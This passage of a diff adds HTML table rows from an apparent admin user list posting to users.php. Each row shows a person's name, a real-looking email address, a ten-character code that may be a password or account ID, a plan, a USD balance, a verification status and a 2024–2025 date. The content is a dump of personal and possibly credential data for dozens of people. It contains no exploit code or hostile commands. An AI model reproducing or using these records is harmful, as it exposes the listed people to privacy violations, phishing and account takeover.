+							<td style="display:none;"><input type="hidden" name="email" value="olliraclehmohj@gamil.com"> </td>
+							
+							<td>M9dGc71e8C</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-02-27 09:25:21</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Blkkubera</td>
+							<td id="email">marlonbain@icloud.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="marlonbain@icloud.com"> </td>
+							
+							<td>SDHgSbhl6T</td>
+							<td>1 week </td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>verified</td>
+							<td>60000</td>
+              
+              <td>2025-02-19 04:01:09</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Frank</td>
+							<td id="email">doxakingventures@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="doxakingventures@gmail.com"> </td>
+							
+							<td>TeVaj8g1C6</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-02-18 16:06:26</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>molla</td>
+							<td id="email">mollatad@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="mollatad@gmail.com"> </td>
+							
+							<td>T3XWwy6BGJ</td>
+							<td> Classic</td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>verified</td>
+							<td>850</td>
+              
+              <td>2025-02-15 02:26:23</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Elliot</td>
+							<td id="email">sisekparidonielliots@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="sisekparidonielliots@gmail.com"> </td>
+							
+							<td>M1He7NC7u6</td>
+							<td> Beginner </td>
+							 <td>-2360 USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>7640</td>
+              
+              <td>2025-02-11 00:57:38</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>efwfeqwefwf</td>
+							<td id="email">timmydakolo17@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="timmydakolo17@gmail.com"> </td>
+							
+							<td>k2yX6CsaNd</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-02-10 15:21:18</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Rana</td>
+							<td id="email">www.ranababar45@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="www.ranababar45@gmail.com"> </td>
+							
+							<td>Z10GgseJV1</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-01-25 13:56:37</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Tema@79</td>
+							<td id="email">mduduzicaswellmathenjwa@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="mduduzicaswellmathenjwa@gmail.com"> </td>
+							
+							<td>XhUNDTly5f</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-01-10 03:09:42</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Kavara hildefons</td>
+							<td id="email">kavarahildefons54@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="kavarahildefons54@gmail.com"> </td>
+							
+							<td>6hMDj0wB1b</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-01-04 13:38:23</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Mxolisi</td>
+							<td id="email">mxolisingangezwe1@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="mxolisingangezwe1@gmail.com"> </td>
+							
+							<td>HstRrACgJe</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-12-13 23:10:36</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>WEALTHFIELD</td>
+							<td id="email">isaiahfrancis65@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="isaiahfrancis65@gmail.com"> </td>
+							
+							<td>eX9eR3dwd9</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-12-10 16:13:03</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Bitupaswan</td>
+							<td id="email">bitup5528@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="bitup5528@gmail.com"> </td>
+							
+							<td>gjhhddN54C</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-11-26 08:34:02</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>NYAGWAYA ERICK</td>
+							<td id="email">nyagwayaerick8@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="nyagwayaerick8@gmail.com"> </td>
+							
+							<td>Bg2Stec0MX</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-11-09 09:01:36</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>El hadj</td>
+							<td id="email">Diengelhadj268@gmail.comd</td>
+							<td style="display:none;"><input type="hidden" name="email" value="Diengelhadj268@gmail.comd"> </td>
+							
+							<td>NTjgdeaBSU</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-10-19 07:52:00</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Kiberesskember</td>
+							<td id="email">kiberesskember@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="kiberesskember@gmail.com"> </td>
+							
+							<td>9uc7MUWj3Z</td>
+							<td> Beginner </td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-10-18 02:49:28</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Ntate</td>
+							<td id="email">ntatemotloung1975@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="ntatemotloung1975@gmail.com"> </td>
+							
+							<td>c7eh8Sshhg</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>verified</td>
+							<td>0</td>
+              
+              <td>2024-10-16 10:18:55</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>ndabatn.nico@gmail.com</td>
+							<td id="email">ndabatn.nico@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="ndabatn.nico@gmail.com"> </td>
+							
+							<td>7C6VlZRstN</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-10-09 07:15:46</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Robert ngwira</td>
+							<td id="email">lunofive5@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="lunofive5@gmail.com"> </td>
+							
+							<td>Wc0uZRQDed</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-10-04 16:44:57</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>gvgmwwbd</td>
+							<td id="email">crackllc373@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="crackllc373@gmail.com"> </td>
+							
+							<td>RV6C73UAQl</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-10-03 01:16:50</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Juan jerrito philemon</td>
+							<td id="email">Philephilippe124@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="Philephilippe124@gmail.com"> </td>
+							
+							<td>NlBWhS52Sh</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-09-30 13:56:00</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Charles Khosa</td>
+							<td id="email">mavona4ckm4@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="mavona4ckm4@gmail.com"> </td>
+							
+							<td>N5lVb06RP8</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>1700</td>
+              
+              <td>2024-09-23 07:49:17</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Justicek</td>
+							<td id="email">justicekalu9@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="justicekalu9@gmail.com"> </td>
+							
+							<td>CMV7Gd4ewJ</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-09-15 10:51:27</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Peter kamau Boniface</td>
+							<td id="email">bigluiz01@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="bigluiz01@gmail.com"> </td>
+							
+							<td>5SDuCCdd36</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-09-12 10:39:16</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Naji Dakis</td>
+							<td id="email">naji.marin18@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="naji.marin18@gmail.com"> </td>
+							
+							<td>bsCA39ZTeD</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-09-10 10:07:39</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>B Rahie</td>
+							<td id="email">nb.sila12@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="nb.sila12@gmail.com"> </td>
+							
+							<td>l2BsdhjJse</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-09-10 04:39:41</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Edwardoh</td>
+							<td id="email">edwardmaiko3@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="edwardmaiko3@gmail.com"> </td>
+							
+							<td>hDU5M3lVHS</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-09-06 11:51:48</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Oliee</td>
+							<td id="email">olieeelliot@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="olieeelliot@gmail.com"> </td>
+							
+							<td>w9U3hGjRhV</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>verified</td>
+							<td>5000</td>
+              
+              <td>2024-09-06 03:56:10</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>leaflet</td>
+							<td id="email">leaf2let@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="leaf2let@gmail.com"> </td>
+							
+							<td>BjS9Th55dV</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-09-06 03:21:03</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Nzimande Gift T</td>
+							<td id="email">nzimandethembane@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="nzimandethembane@gmail.com"> </td>
+							
+							<td>b9CGdS5S3s</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-06-30 07:46:50</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Buhlebuyeza@Dunge</td>
+							<td id="email">Buhlebuyeza@Dunge</td>
+							<td style="display:none;"><input type="hidden" name="email" value="Buhlebuyeza@Dunge"> </td>
+							
+							<td>cBHyedMrSe</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>50</td>
+              
+              <td>2024-06-30 05:53:03</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>France</td>
+							<td id="email">saikafrancis85@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="saikafrancis85@gmail.com"> </td>
+							
+							<td>M9PkNaBhDR</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-06-27 09:27:09</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>kWANDA</td>
+							<td id="email">sklushabah@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="sklushabah@gmail.com"> </td>
+							
+							<td>B8e91lbUBh</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-06-27 08:22:25</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Thabang rathari</td>
+							<td id="email">kebadiretse88@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="kebadiretse88@gmail.com"> </td>
+							
+							<td>jRglbW5ec0</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-06-26 09:07:56</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>MUHAMMAD AQEEL RAZA</td>
+							<td id="email">razaaqeel886@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="razaaqeel886@gmail.com"> </td>
+							
+							<td>tU3WcBhlhT</td>
+							<td> Premium</td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-06-23 18:51:06</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Carlardee16</td>
+							<td id="email">michaeldimabuyu6@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="michaeldimabuyu6@gmail.com"> </td>
+							
+							<td>C6TbCDZQSu</td>
+							<td> Beginner </td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-06-19 01:45:33</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Kinard46</td>
+							<td id="email">bkinard33@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="bkinard33@gmail.com"> </td>
+							
+							<td>TUHcDBX8SJ</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-06-18 11:00:44</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Costaricajames3345</td>
+							<td id="email">jd7254672@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="jd7254672@gmail.com"> </td>
+							
+							<td>GeUddhTshA</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-06-15 03:42:46</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>tybow125</td>
+							<td id="email">tybow125@yahoo.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="tybow125@yahoo.com"> </td>
+							
+							<td>A2c6DUNeBN</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-06-02 12:09:53</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Dr Phil C</td>
+							<td id="email">philanicuambe@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="philanicuambe@gmail.com"> </td>
+							
+							<td>hsGgUSPshu</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>620</td>
+              
+              <td>2024-05-12 13:23:39</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Isaac</td>
+							<td id="email">nzivoisaac@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="nzivoisaac@gmail.com"> </td>
+							
+							<td>1sUc8l78Dg</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-05-09 13:59:25</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Oriyo</td>
+							<td id="email">oriyochristopher@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="oriyochristopher@gmail.com"> </td>
+							
+							<td>MlgshSb93h</td>
+							<td>1 week</td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>820</td>
+              
+              <td>2024-04-30 05:21:39</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>paul ongowe buodo</td>
+							<td id="email">paulongowebuodo@gmal.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="paulongowebuodo@gmal.com"> </td>
+							
+							<td>Urds7Ns5w1</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-04-25 00:15:27</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Paul</td>
+							<td id="email">southafricarevenueserviceservi@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="southafricarevenueserviceservi@gmail.com"> </td>
+							
+							<td>TCHWbgVs75</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-04-24 21:48:38</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>ongowe paul</td>
+							<td id="email">ongowe@mail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="ongowe@mail.com"> </td>
+							
+							<td>lBjBCkGRhb</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-04-24 21:14:54</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>paulongowebuodo@gmail.com</td>
+							<td id="email">paulongowebuodo@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="paulongowebuodo@gmail.com"> </td>
+							
+							<td>BCS5Hw9Cdt</td>
+							<td>1week</td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>verified</td>
+							<td>7300</td>
+              
+              <td>2024-04-24 16:21:27</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Sam maich</td>
+							<td id="email">smaina159@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="smaina159@gmail.com"> </td>
+							
+							<td>e9dTCh37dh</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-04-02 10:54:17</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>moxeydaytonsr@gmail.com</td>
+							<td id="email">moxeydaytonsr@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="moxeydaytonsr@gmail.com"> </td>
+							
+							<td>h9VDNP873f</td>
+							<td>2 weeks</td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>60000</td>
+              
+              <td>2024-04-01 08:59:50</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Boyd Mwewa</td>
+							<td id="email">bmwewa613@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="bmwewa613@gmail.com"> </td>
+							
+							<td>d1hND6T3BT</td>
+							<td>2 weeks</td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>520</td>
+              
+              <td>2024-03-27 06:53:25</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Robert OWUOR </td>
+							<td id="email">oukorobert657@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="oukorobert657@gmail.com"> </td>
+							
+							<td>NkwTc07VSV</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2024-03-25 16:40:45</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>George Muriithi</td>
+							<td id="email">georgemukami26@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="georgemukami26@gmail.com"> </td>
+							
+							<td>u8shwZtkRG</td>
+							<td>1week</td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>verified</td>
+							<td>1500</td>
+              
+              <td>2024-03-13 07:40:28</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
